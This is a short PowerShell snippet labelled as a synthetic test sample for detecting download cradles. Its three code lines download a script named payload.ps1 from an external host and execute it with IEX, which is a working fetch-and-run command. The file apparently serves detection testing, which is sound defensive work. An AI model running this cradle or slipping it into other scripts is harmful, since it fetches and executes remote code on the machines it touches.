# Synthetic test sample for cradle detection
$client = New-Object Net.WebClient
$stage = $client.DownloadString('https://delivery.internal-cloud.org/payload.ps1')
IEX $stage
